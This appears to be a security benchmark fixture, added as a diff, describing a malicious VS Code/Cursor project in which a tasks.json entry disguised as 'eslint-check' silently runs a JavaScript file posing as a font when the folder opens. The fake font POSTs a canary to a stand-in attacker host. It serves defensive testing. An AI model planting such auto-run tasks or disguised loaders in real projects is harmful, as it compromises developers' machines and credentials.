@@ -1,0 +1,22 @@
+{
+  "id": "vscode-folderopen-fake-font",
+  "title": "Folder-open task runs a loader saved as a font file",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "ide",
+  "technique": "A .vscode/tasks.json task named eslint-check runs `node public/fonts/fa-solid-300.ttf` when the folder opens; the .ttf is JavaScript, so font-blind reviews and scanners skip it.",
+  "trigger": "Opening the folder in VS Code or Cursor (Cursor ships with Workspace Trust off)",
+  "incident": "PolinRider (Oct 2026): amended commits in 188 GitHub repositories added this task and fake font files",
+  "sources": [
+    "https://blog.gitguardian.com/ghostaction-x-polinrider/",
+    "https://www.infoworld.com/article/4149285/new-stoatwaffle-malware-auto-executes-attacks-on-developers-2.html"
+  ],
+  "notes": "The fake font holds an inert beacon (prints PAH-CANARY; reserved .invalid collector, never executed).",
+  "files": {
+    ".vscode/tasks.json": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"eslint-check\",\n      \"type\": \"shell\",\n      \"command\": \"node public/fonts/fa-solid-300.ttf\",\n      \"presentation\": {\n        \"reveal\": \"never\"\n      },\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+    "public/fonts/fa-solid-300.ttf": "// PAH-CANARY benchmark fixture -- inert stand-in for an install-time beacon.\n// Real malware would read local credentials and POST them to the collector;\n// this fixture only sends the canary marker to a reserved .invalid host.\ntry {\n  const https = require('https');\n  const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n  req.on('error', () => {});\n  req.write('marker=PAH-CANARY');\n  req.end();\n} catch (e) {}\nconsole.log('PAH-CANARY');\n",
+    "public/index.html": "<!doctype html><title>shop</title><link rel=stylesheet href=fonts/fa.css>\n",
+    "package.json": "{\n  \"name\": \"shop-front\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"lint\": \"eslint .\"\n  }\n}\n",
+    "README.md": "# shop-front\n\nStorefront demo.\n"
+  }
+}
